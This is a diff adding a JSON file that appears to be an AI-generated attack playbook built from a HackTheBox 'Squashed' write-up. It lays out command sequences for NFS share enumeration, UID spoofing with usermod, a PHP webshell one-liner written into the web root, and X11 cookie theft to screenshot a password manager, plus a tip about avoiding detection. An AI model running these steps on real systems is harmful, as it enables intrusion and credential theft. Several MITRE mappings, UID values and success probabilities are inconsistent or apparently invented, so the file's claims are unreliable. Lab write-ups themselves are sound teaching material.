@@ -1,0 +1,989 @@
+{
+  "writeup_id": "Htb_Squashed",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_nfs_misconfiguration_x11_hijack",
+    "primary_services": [
+      "nfs",
+      "http",
+      "ssh",
+      "rpc"
+    ],
+    "port_signature": "22+80+111+2049",
+    "service_combination": "ssh+http+rpc+nfs",
+    "os_family": "linux",
+    "environment_type": "standalone_server",
+    "entry_vector": "nfs_share_abuse",
+    "privilege_path": "webshell_to_x11_hijack",
+    "attack_complexity": "medium",
+    "estimated_time": "60-90 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "world_writable_nfs_shares",
+      "web_directory_nfs_mount",
+      "x11_magic_cookie_exposure",
+      "uid_manipulation_required"
+    ],
+    "environmental_clues": [
+      "multiple_nfs_exports",
+      "home_directory_nfs_share",
+      "web_root_nfs_share",
+      "x11_session_artifacts"
+    ],
+    "similar_scenarios": [
+      "nfs_root_squash_bypass",
+      "x11_session_hijack"
+    ],
+    "unique_aspects": [
+      "password_manager_screenshot",
+      "dual_nfs_share_exploitation",
+      "uid_matching_requirement"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "NFS_Share_Enumeration",
+        "success_reason": "NFS shares exposed with wildcard access permissions",
+        "prerequisite_indicators": [
+          "nfs_service_running",
+          "rpcbind_accessible",
+          "mountd_services_available"
+        ],
+        "recognition_patterns": [
+          "showmount -e returns shares",
+          "wildcard (*) export permissions",
+          "web directory and home directory exposed"
+        ],
+        "failure_modes": [
+          "nfs_not_exposed",
+          "restrictive_export_permissions",
+          "firewall_blocking_rpc_ports"
+        ],
+        "environmental_factors": [
+          "default_nfs_configuration",
+          "overly_permissive_exports",
+          "development_environment_settings"
+        ],
+        "success_probability": 0.92,
+        "typical_timeframe": "2-5 minutes"
+      },
+      {
+        "technique": "NFS_UID_Manipulation",
+        "success_reason": "NFS uses numeric UIDs without authentication, allowing local UID spoofing",
+        "prerequisite_indicators": [
+          "nfs_share_mounted",
+          "target_files_owned_by_specific_uid",
+          "local_root_access_available"
+        ],
+        "recognition_patterns": [
+          "files show numeric UIDs (1001, 33)",
+          "permission denied on file access",
+          "www-data equivalent UID (33) identified"
+        ],
+        "failure_modes": [
+          "root_squashing_enabled",
+          "all_squash_configured",
+          "secure_nfs_implementation"
+        ],
+        "environmental_factors": [
+          "insecure_nfs_defaults",
+          "no_root_squashing",
+          "trust_based_file_permissions"
+        ],
+        "success_probability": 0.85,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "Webshell_Upload_via_NFS",
+        "success_reason": "Web directory writable through NFS with appropriate UID permissions",
+        "prerequisite_indicators": [
+          "web_directory_nfs_mounted",
+          "write_permissions_with_correct_uid",
+          "web_server_executes_uploaded_files"
+        ],
+        "recognition_patterns": [
+          "/var/www/html exposed via NFS",
+          "UID 33 (www-data) write access",
+          "PHP or script execution enabled"
+        ],
+        "failure_modes": [
+          "read_only_nfs_mount",
+          "web_server_execution_disabled",
+          "file_upload_restrictions"
+        ],
+        "environmental_factors": [
+          "apache_php_enabled",
+          "no_upload_restrictions",
+          "executable_permissions_allowed"
+        ],
+        "success_probability": 0.78,
+        "typical_timeframe": "15-30 minutes"
+      },
+      {
+        "technique": "X11_Cookie_Extraction",
+        "success_reason": "X11 authentication cookie accessible through NFS share",
+        "prerequisite_indicators": [
+          "user_home_directory_accessible",
+          "xauthority_file_present",
+          "x11_session_active"
+        ],
+        "recognition_patterns": [
+          ".Xauthority file in home directory",
+          "recent modification timestamps",
+          "xsession-errors indicating active session"
+        ],
+        "failure_modes": [
+          "no_x11_session_running",
+          "xauthority_file_protected",
+          "display_not_accessible"
+        ],
+        "environmental_factors": [
+          "desktop_environment_running",
+          "user_logged_in_locally",
+          "x11_forwarding_enabled"
+        ],
+        "success_probability": 0.65,
+        "typical_timeframe": "20-45 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "NFS shares with wildcard permissions",
+        "discovery_method": "showmount -e enumeration",
+        "why_critical": "Exposed both web directory and user home directory",
+        "how_to_recognize": [
+          "multiple sensitive directories exported",
+          "wildcard (*) in export list",
+          "web root and home directories accessible"
+        ],
+        "follow_up_actions": [
+          "mount_all_available_shares",
+          "identify_file_ownership_patterns",
+          "test_write_permissions"
+        ]
+      },
+      {
+        "discovery": "UID-based file permissions (33 for www-data)",
+        "discovery_method": "File listing analysis and UID enumeration",
+        "why_critical": "Enabled webshell upload by matching web server UID",
+        "how_to_recognize": [
+          "numeric UIDs in file listings",
+          "UID 33 commonly indicates www-data",
+          "write permissions based on UID matching"
+        ],
+        "follow_up_actions": [
+          "create_user_with_target_uid",
+          "test_file_write_capabilities",
+          "upload_webshell_or_backdoor"
+        ]
+      },
+      {
+        "discovery": ".Xauthority file in user home",
+        "discovery_method": "NFS home directory enumeration",
+        "why_critical": "Provided X11 session access for screen capture",
+        "how_to_recognize": [
+          "recent .Xauthority modification time",
+          "active .xsession-errors file",
+          "desktop environment indicators"
+        ],
+        "follow_up_actions": [
+          "copy_xauthority_file",
+          "set_display_environment",
+          "attempt_screen_capture"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "web_shell_access",
+        "escalation_method": "X11_screen_capture",
+        "why_possible": "User had active X11 session with password manager open",
+        "recognition_signs": [
+          "xauthority_file_accessible",
+          "display_environment_available",
+          "desktop_session_running"
+        ],
+        "exploitation_path": "NFS mount → X11 cookie → Screen capture → Password extraction"
+      },
+      {
+        "privilege_level": "nfs_file_access",
+        "escalation_method": "UID_spoofing_to_webshell",
+        "why_possible": "NFS trust model allows UID manipulation for file access",
+        "recognition_signs": [
+          "numeric_uids_in_file_listings",
+          "web_directory_nfs_accessible",
+          "local_uid_modification_possible"
+        ],
+        "exploitation_path": "Mount NFS → Change local UID → Upload webshell → RCE"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 22,80,111,2049 and multiple high RPC ports open on Linux host",
+        "decision": "Identify as NFS server and enumerate shares first",
+        "reasoning": "Port 2049 (NFS) with multiple RPC services indicates file sharing opportunities",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "web_enumeration",
+            "when": "if NFS shares are empty or inaccessible"
+          },
+          {
+            "option": "ssh_enumeration",
+            "when": "if credentials found"
+          }
+        ],
+        "success_indicators": [
+          "nfs_shares_discovered",
+          "showmount_returns_exports",
+          "mountable_shares_found"
+        ],
+        "next_decision": "enumerate_nfs_shares"
+      },
+      {
+        "step": 2,
+        "situation": "NFS shares /home/ross and /var/www/html discovered",
+        "decision": "Mount both shares and check file permissions",
+        "reasoning": "Web root access could lead to code execution, home directory may contain credentials",
+        "confidence": 0.85,
+        "prerequisites": [
+          "nfs_client_available",
+          "mount_permissions"
+        ],
+        "success_indicators": [
+          "shares_mounted_successfully",
+          "file_listing_possible"
+        ],
+        "failure_fallbacks": [
+          "web_directory_bruteforce",
+          "rpc_enumeration"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Files owned by UID 1001, permission denied on sensitive directories",
+        "decision": "Create local user with matching UID 1001 to bypass NFS permissions",
+        "reasoning": "NFS uses UID/GID for access control, not usernames",
+        "confidence": 0.95,
+        "prerequisites": [
+          "root_access_on_attacking_machine"
+        ],
+        "success_indicators": [
+          "can_read_restricted_files",
+          "write_access_to_shares"
+        ],
+        "next_decision": "choose_target_share_for_exploitation"
+      },
+      {
+        "step": 4,
+        "situation": "Have write access to /var/www/html via UID manipulation",
+        "decision": "Upload webshell to gain code execution",
+        "reasoning": "Direct path to RCE through web server",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "explore_home_directory",
+            "when": "if webshell upload fails"
+          },
+          {
+            "option": "modify_existing_files",
+            "when": "if new file creation blocked"
+          }
+        ],
+        "success_indicators": [
+          "webshell_uploaded",
+          "code_execution_achieved"
+        ],
+        "next_decision": "establish_reverse_shell"
+      }
+    ],
+    "branching_logic": {
+      "if_nfs_shares_writable": {
+        "action": "exploit_web_root_write_access",
+        "tools": [
+          "php_webshell",
+          "reverse_shell_payload"
+        ],
+        "next_phase": "code_execution_and_enumeration"
+      },
+      "if_home_directory_accessible": {
+        "action": "search_for_credentials_and_keys",
+        "alternatives": [
+          "ssh_keys",
+          "password_files",
+          "x11_cookies"
+        ],
+        "decision_criteria": "based_on_file_types_found"
+      },
+      "if_x11_authority_found": {
+        "action": "attempt_x11_screenshot_attack",
+        "purpose": "capture_desktop_for_credential_harvesting",
+        "tools": [
+          "xwd",
+          "xwininfo",
+          "x11_forwarding"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_check_nfs_uid_permissions_first",
+        "reasoning": "uid_manipulation_often_bypasses_nfs_restrictions",
+        "applicability": "nfs_environments"
+      },
+      {
+        "rule": "prioritize_web_root_over_home_directory",
+        "reasoning": "web_root_provides_immediate_code_execution",
+        "applicability": "when_both_shares_writable"
+      },
+      {
+        "rule": "examine_x11_files_for_desktop_access",
+        "reasoning": "x11_authority_can_provide_gui_access_for_credential_theft",
+        "applicability": "desktop_linux_environments"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "NFS Share Enumeration",
+        "mitre_id": "T1135",
+        "required_services": [
+          "nfs",
+          "rpcbind",
+          "mountd"
+        ],
+        "required_ports": [
+          111,
+          2049
+        ],
+        "os_requirements": [
+          "linux",
+          "unix"
+        ],
+        "environmental_prerequisites": [
+          "nfs_service_running",
+          "rpcbind_accessible",
+          "shares_exported"
+        ],
+        "success_indicators": [
+          "showmount_returns_exports",
+          "mount_succeeds",
+          "directory_listing_accessible"
+        ],
+        "incompatible_with": [
+          "nfs_disabled",
+          "strict_export_restrictions",
+          "network_isolation"
+        ],
+        "confidence_boosters": [
+          "wildcard_export_permissions",
+          "sensitive_directories_exported",
+          "web_root_accessible"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "2-5 minutes"
+      },
+      {
+        "technique": "NFS UID Manipulation",
+        "mitre_id": "T1134.001",
+        "required_services": [
+          "nfs"
+        ],
+        "required_ports": [
+          2049
+        ],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "nfs_share_mounted",
+          "uid_based_permissions",
+          "local_uid_control"
+        ],
+        "success_indicators": [
+          "file_access_after_uid_change",
+          "write_permissions_gained",
+          "directory_traversal_possible"
+        ],
+        "incompatible_with": [
+          "kerberos_authentication",
+          "strong_access_controls",
+          "root_squashing_enabled"
+        ],
+        "confidence_boosters": [
+          "numeric_uid_shown_in_ls",
+          "permission_denied_errors",
+          "web_directory_writable"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "5-10 minutes"
+      },
+      {
+        "technique": "Web Shell Upload via NFS",
+        "mitre_id": "T1505.003",
+        "required_services": [
+          "nfs",
+          "http"
+        ],
+        "required_ports": [
+          80,
+          443,
+          2049
+        ],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "web_root_nfs_mounted",
+          "write_access_to_webroot",
+          "web_server_executes_uploads"
+        ],
+        "success_indicators": [
+          "file_upload_successful",
+          "web_shell_accessible_via_http",
+          "command_execution_confirmed"
+        ],
+        "incompatible_with": [
+          "read_only_nfs_mount",
+          "web_server_disabled",
+          "file_execution_blocked"
+        ],
+        "confidence_boosters": [
+          "apache_php_enabled",
+          "no_upload_restrictions",
+          "direct_webroot_access"
+        ],
+        "typical_success_rate": 0.9,
+        "estimated_time": "3-8 minutes"
+      },
+      {
+        "technique": "X11 Session Hijacking",
+        "mitre_id": "T1021.004",
+        "required_services": [
+          "x11",
+          "nfs"
+        ],
+        "required_ports": [
+          6000,
+          2049
+        ],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "x11_session_active",
+          "xauth_cookie_accessible",
+          "display_server_running"
+        ],
+        "success_indicators": [
+          "xauth_cookie_found",
+          "screenshot_capture_successful",
+          "display_access_granted"
+        ],
+        "incompatible_with": [
+          "x11_disabled",
+          "wayland_only",
+          "strict_x11_permissions"
+        ],
+        "confidence_boosters": [
+          "xauth_files_in_nfs",
+          "active_desktop_session",
+          "password_manager_visible"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "10-20 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "nfs_environment": {
+        "port_indicators": [
+          111,
+          2049,
+          20048
+        ],
+        "service_indicators": [
+          "nfs",
+          "rpcbind",
+          "mountd",
+          "nlockmgr"
+        ],
+        "banner_indicators": [
+          "NFS",
+          "RPC",
+          "mountd"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "apache",
+          "nginx",
+          "iis"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "linux_desktop": {
+        "port_indicators": [
+          6000,
+          6001,
+          6002
+        ],
+        "service_indicators": [
+          "x11",
+          "xorg"
+        ],
+        "file_indicators": [
+          ".Xauth",
+          ".xsession-errors",
+          ".cache"
+        ],
+        "confidence_threshold": 0.8
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "nfs_share_enumeration",
+          "when": "nfs_service_detected",
+          "reason": "often_reveals_sensitive_directories_and_files"
+        },
+        {
+          "attack": "nfs_uid_manipulation",
+          "when": "nfs_permission_denied_errors",
+          "reason": "high_success_rate_for_privilege_escalation"
+        },
+        {
+          "attack": "web_shell_upload_via_nfs",
+          "when": "webroot_nfs_share_detected",
+          "reason": "direct_path_to_code_execution"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "x11_session_hijacking",
+          "when": "x11_artifacts_in_nfs_share",
+          "reason": "can_reveal_passwords_but_requires_active_session"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "NFS Share Enumeration",
+        "mitre_id": "T1135",
+        "category": "discovery",
+        "phase": "reconnaissance",
+        "tools_used": [
+          {
+            "name": "showmount",
+            "command_template": "showmount -e {target_ip}",
+            "actual_command": "showmount -e 10.10.11.191",
+            "output_pattern": "Export list for {ip}:\n/{share_path}    *",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          },
+          {
+            "name": "nmap",
+            "command_template": "nmap -p- --min-rate 10000 {target_ip}",
+            "actual_command": "nmap -p- --min-rate 10000 10.10.11.191",
+            "success_factors": [
+              "nfs_port_2049_open",
+              "rpc_services_detected"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "nfs_service_accessible",
+          "network_connectivity",
+          "rpc_services_running"
+        ],
+        "success_indicators": [
+          "shares_enumerated_successfully",
+          "export_list_returned",
+          "accessible_mount_points_identified"
+        ],
+        "common_failures": [
+          "nfs_service_not_running",
+          "firewall_blocking_rpc_ports",
+          "no_exported_shares"
+        ],
+        "follow_up_techniques": [
+          "nfs_mount_exploitation",
+          "file_system_enumeration",
+          "credential_harvesting"
+        ],
+        "time_investment": "2-5 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "NFS Mount Exploitation",
+        "mitre_id": "T1021.002",
+        "category": "lateral_movement",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "mount",
+            "command_template": "sudo mount -t nfs {target_ip}:/{share_path} {local_mount_point}",
+            "actual_command": "sudo mount -t nfs 10.10.11.191:/var/www/html /mnt",
+            "output_pattern": "successful_mount_no_errors",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "usermod",
+            "command_template": "sudo usermod -u {target_uid} {local_user}",
+            "actual_command": "sudo usermod -u 2017 dummy",
+            "success_factors": [
+              "matching_uid_to_nfs_owner",
+              "local_admin_access"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "nfs_shares_identified",
+          "local_root_access_for_mounting",
+          "writable_nfs_exports"
+        ],
+        "success_indicators": [
+          "successful_mount_operation",
+          "file_read_write_access_gained",
+          "uid_manipulation_successful"
+        ],
+        "common_failures": [
+          "permission_denied_on_mount",
+          "read_only_file_system",
+          "uid_mismatch_preventing_access"
+        ],
+        "follow_up_techniques": [
+          "webshell_upload",
+          "credential_file_access",
+          "privilege_escalation"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "X11 Magic Cookie Extraction",
+        "mitre_id": "T1552.001",
+        "category": "credential_access",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "xxd",
+            "command_template": "xxd {xauthority_file}",
+            "actual_command": "xxd .Xauthority",
+            "output_pattern": "MIT-MAGIC-COOKIE",
+            "effectiveness_rating": 4,
+            "reliability": 0.9
+          },
+          {
+            "name": "find",
+            "command_template": "find {mount_point} -name '.Xauthority' -ls",
+            "actual_command": "find /mnt -name '.Xauthority' -ls",
+            "success_factors": [
+              "x11_session_active",
+              "xauthority_file_accessible"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "nfs_access_to_user_home",
+          "active_x11_session",
+          "xauthority_file_present"
+        ],
+        "success_indicators": [
+          "xauthority_file_located",
+          "magic_cookie_extracted",
+          "x11_authentication_possible"
+        ],
+        "common_failures": [
+          "no_active_x11_session",
+          "xauthority_file_not_readable",
+          "x11_forwarding_disabled"
+        ],
+        "follow_up_techniques": [
+          "x11_screenshot_capture",
+          "x11_keylogging",
+          "desktop_environment_exploitation"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Web Shell Upload via NFS",
+        "mitre_id": "T1505.003",
+        "category": "persistence",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "echo",
+            "command_template": "echo -e '<?php\\n  system($_GET[\"cmd\"]);\\n?>' > {webroot}/{shell_name}.php",
+            "actual_command": "echo -e '<?php\\n  echo \"0xdf was here!\";\\n?>' > /mnt/0xdf.php",
+            "output_pattern": "file_written_successfully",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "nfs_write_access_to_webroot",
+          "php_enabled_webserver",
+          "appropriate_uid_permissions"
+        ],
+        "success_indicators": [
+          "php_file_uploaded_successfully",
+          "webshell_accessible_via_http",
+          "command_execution_confirmed"
+        ],
+        "common_failures": [
+          "php_not_enabled",
+          "file_permissions_insufficient",
+          "webserver_security_restrictions"
+        ],
+        "follow_up_techniques": [
+          "reverse_shell_establishment",
+          "system_enumeration",
+          "privilege_escalation"
+        ],
+        "time_investment": "5-10 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "showmount",
+        "use_case": "nfs_share_discovery",
+        "effectiveness_rating": 5,
+        "reliability": 0.98,
+        "learning_curve": "low",
+        "essential_for": [
+          "nfs_environments"
+        ],
+        "alternatives": [
+          "rpcinfo",
+          "manual_nfs_probing"
+        ],
+        "best_practices": [
+          "run_against_all_discovered_nfs_services",
+          "check_both_tcp_and_udp_variants",
+          "enumerate_before_attempting_mounts"
+        ]
+      },
+      {
+        "tool": "mount",
+        "use_case": "nfs_exploitation",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "nfs_share_access"
+        ],
+        "alternatives": [
+          "nfs-utils",
+          "manual_nfs_client"
+        ],
+        "best_practices": [
+          "create_dedicated_mount_points",
+          "match_uid_gid_for_proper_access",
+          "unmount_when_finished_to_avoid_detection"
+        ]
+      },
+      {
+        "tool": "usermod",
+        "use_case": "uid_manipulation_for_nfs",
+        "effectiveness_rating": 5,
+        "reliability": 0.98,
+        "learning_curve": "low",
+        "essential_for": [
+          "nfs_permission_bypass"
+        ],
+        "alternatives": [
+          "adduser_with_specific_uid",
+          "su_with_uid_spoofing"
+        ],
+        "best_practices": [
+          "create_dummy_users_for_uid_manipulation",
+          "identify_target_uid_from_ls_output",
+          "restore_original_uids_after_exploitation"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "nfs_to_webshell_exploitation",
+        "steps": [
+          {
+            "step": 1,
+            "command": "showmount -e 10.10.11.191",
+            "purpose": "Enumerate available NFS shares",
+            "expected_output": "/home/ross and /var/www/html shares"
+          },
+          {
+            "step": 2,
+            "command": "sudo mount -t nfs 10.10.11.191:/var/www/html /mnt",
+            "purpose": "Mount web root NFS share",
+            "expected_output": "Successful mount operation"
+          },
+          {
+            "step": 3,
+            "command": "ls -ld /mnt",
+            "purpose": "Identify required UID for access",
+            "expected_output": "Directory owned by UID 2017"
+          },
+          {
+            "step": 4,
+            "command": "sudo usermod -u 2017 dummy",
+            "purpose": "Match local UID to NFS requirements",
+            "expected_output": "UID successfully changed"
+          },
+          {
+            "step": 5,
+            "command": "echo '<?php system($_GET[\"cmd\"]); ?>' > /mnt/shell.php",
+            "purpose": "Upload PHP webshell",
+            "expected_output": "Webshell file created"
+          }
+        ],
+        "success_rate": 0.92,
+        "typical_duration": "10-20 minutes"
+      },
+      {
+        "sequence_name": "x11_credential_extraction",
+        "steps": [
+          {
+            "step": 1,
+            "command": "sudo mount -t nfs 10.10.11.191:/home/ross /mnt",
+            "purpose": "Mount user home directory",
+            "expected_output": "Home directory accessible"
+          },
+          {
+            "step": 2,
+            "command": "find /mnt -name '.Xauthority' -ls",
+            "purpose": "Locate X11 authority file",
+            "expected_output": "Xauthority file found"
+          },
+          {
+            "step": 3,
+            "command": "xxd /mnt/.Xauthority",
+            "purpose": "Extract X11 magic cookie",
+            "expected_output": "MIT-MAGIC-COOKIE data visible"
+          },
+          {
+            "step": 4,
+            "command": "cp /mnt/.Xauthority ~/.Xauthority",
+            "purpose": "Copy authority file for X11 access",
+            "expected_output": "File copied successfully"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "5-15 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Squashed",
+      "difficulty": "Easy",
+      "os": "Linux Ubuntu",
+      "platform": "HackTheBox",
+      "release_date": "2022-11-10",
+      "author": "polarbearer, C4rm3l0",
+      "estimated_time": "30-45 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "low",
+      "skill_level_required": "beginner",
+      "primary_attack_vectors": [
+        "nfs_misconfiguration",
+        "x11_hijacking"
+      ],
+      "key_vulnerabilities": [
+        "nfs_world_writable_shares",
+        "x11_session_exposure"
+      ],
+      "environment_type": "linux_workstation",
+      "real_world_relevance": "medium",
+      "learning_value": [
+        "nfs_enumeration",
+        "uid_manipulation",
+        "x11_exploitation"
+      ],
+      "prerequisite_knowledge": [
+        "basic_linux",
+        "file_permissions",
+        "web_shells"
+      ]
+    },
+    "categorization": {
+      "primary_category": "network_file_systems",
+      "subcategories": [
+        "nfs_exploitation",
+        "x11_attacks",
+        "privilege_escalation"
+      ],
+      "attack_types": [
+        "initial_access",
+        "credential_access",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "secure_nfs_configuration",
+        "x11_security",
+        "desktop_security"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Keeper",
+        "Shared",
+        "Networked"
+      ],
+      "similarity_reasons": [
+        "file_system_exploitation",
+        "credential_exposure",
+        "desktop_environments"
+      ],
+      "unique_aspects": [
+        "x11_magic_cookie",
+        "password_manager_screenshot",
+        "nfs_uid_matching"
+      ],
+      "difficulty_factors": [
+        "straightforward_nfs_enum",
+        "creative_x11_attack",
+        "visual_credential_theft"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T19:39:15.900648",
+    "original_file": "0xdf_writeups/Htb Squashed.md",
+    "content_length": 25480,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
